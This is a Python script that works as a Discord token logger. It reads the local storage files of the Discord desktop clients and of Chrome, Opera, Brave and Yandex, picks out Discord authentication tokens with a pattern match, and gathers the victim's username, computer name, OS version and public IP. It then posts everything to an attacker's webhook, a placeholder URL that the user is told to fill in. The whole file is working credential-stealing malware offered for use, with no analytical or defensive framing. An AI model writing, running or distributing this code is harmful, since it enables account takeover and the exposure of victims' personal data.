import os
import json
import requests
import base64
import subprocess
import sys
from pathlib import Path

# Configuration - Replace with your webhook URL
WEBHOOK_URL = "YOUR_WEBHOOK_URL_HERE"

def get_discord_tokens():
    tokens = []
    
    # Paths to check for Discord tokens
    paths = [
        os.path.expandvars(r"%APPDATA%\Discord\Local Storage\leveldb"),
        os.path.expandvars(r"%APPDATA%\DiscordCanary\Local Storage\leveldb"),
        os.path.expandvars(r"%APPDATA%\Lightcord\Local Storage\leveldb"),
        os.path.expandvars(r"%LOCALAPPDATA%\Google\Chrome\User Data\Default\Local Storage\leveldb"),
        os.path.expandvars(r"%LOCALAPPDATA%\Opera Software\Opera Stable\Local Storage\leveldb"),
        os.path.expandvars(r"%LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data\Default\Local Storage\leveldb"),
        os.path.expandvars(r"%LOCALAPPDATA%\Yandex\YandexBrowser\User Data\Default\Local Storage\leveldb")
    ]
    
    for path in paths:
        if os.path.exists(path):
            for file_name in os.listdir(path):
                if file_name.endswith(".log") or file_name.endswith(".ldb"):
                    try:
                        with open(os.path.join(path, file_name), "r", errors="ignore") as file:
                            content = file.read()
                            for token in extract_tokens(content):
                                if token not in tokens:
                                    tokens.append(token)
                    except:
                        pass
    
    return tokens

def extract_tokens(content):
    tokens = []
    
    # Look for patterns that match Discord tokens
    import re
    pattern = r"[a-zA-Z0-9_-]{24}\.[a-zA-Z0-9_-]{6}\.[a-zA-Z0-9_-]{27}"
    matches = re.findall(pattern, content)
    
    for match in matches:
        if is_valid_token(match):
            tokens.append(match)
    
    return tokens

def is_valid_token(token):
    # Basic validation check
    if len(token) < 50:
        return False
    return True

def get_system_info():
    info = {}
    
    # Get basic system information
    info["username"] = os.environ.get("USERNAME")
    info["computer_name"] = os.environ.get("COMPUTERNAME")
    info["os"] = subprocess.check_output("ver", shell=True).decode("utf-8").strip()
    
    try:
        # Get IP address
        ip = subprocess.check_output("nslookup myip.opendns.com resolver1.opendns.com", shell=True).decode("utf-8")
        ip_lines = ip.split("\n")
        for line in ip_lines:
            if "Address:" in line and "53" not in line:
                info["ip"] = line.split(":")[1].strip()
                break
    except:
        info["ip"] = "Unknown"
    
    return info

def send_to_webhook(tokens, system_info):
    if not tokens:
        return
    
    # Prepare the message
    message = "Discord Token Logger Results\n"
    message += "=" * 30 + "\n\n"
    
    message += "System Information:\n"
    for key, value in system_info.items():
        message += f"{key}: {value}\n"
    
    message += "\nDiscord Tokens Found:\n"
    for i, token in enumerate(tokens, 1):
        message += f"Token {i}: {token}\n"
    
    # Send to Discord webhook
    data = {
        "content": message
    }
    
    try:
        response = requests.post(WEBHOOK_URL, json=data)
        if response.status_code == 204:
            print("Data sent successfully")
        else:
            print(f"Failed to send data: {response.status_code}")
    except Exception as e:
        print(f"Error sending data: {e}")

def main():
    # Get tokens and system info
    tokens = get_discord_tokens()
    system_info = get_system_info()
    
    # Send to webhook
    send_to_webhook(tokens, system_info)

if __name__ == "__main__":
    main()
